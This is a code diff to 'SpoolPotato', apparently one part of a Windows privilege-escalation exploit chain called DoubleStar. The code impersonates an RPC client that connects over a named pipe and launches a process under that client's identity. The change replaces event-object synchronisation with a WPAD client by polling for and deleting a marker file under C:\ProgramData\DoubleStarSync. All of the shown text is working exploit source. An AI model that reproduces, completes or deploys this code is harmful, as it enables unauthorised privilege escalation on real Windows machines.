@@ -23,6 +23,8 @@
 #define SESSION_ID 1
 #define COMMAND_LINE L"notepad.exe"
 #define INTERACTIVE_PROCESS FALSE
+#define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
+#define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
 
 ////////
 ////////
@@ -299,8 +301,7 @@ BOOL SpoolPotato() {
                 DebugLog(L"... recieved connection over named pipe");
 
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS)) {
-                    HANDLE hSyncEvent; // Event object to sync success status with WPAD client
-                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event object with WPAD client...");
+                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event file with WPAD client...");
 
                     /*
                     SpoolPotato/WPAD client synchronization
@@ -327,12 +328,11 @@ BOOL SpoolPotato() {
                     4. Terminates itself.
                     */
 
-                    while ((hSyncEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"DoubleStarSync")) == NULL) {
+                    while (!DeleteFileW(SYNC_FILE)) {
                         Sleep(500);
                     }
 
-                    SetEvent(hSyncEvent);
-                    DebugLog(L"... successfully synced WPAD client event and triggered its object");
+                    DebugLog(L"... successfully synced WPAD client event file and deleted it");
                 }
                 else {
                     DebugLog(L"... failed to launch process while impersonating RPC client");
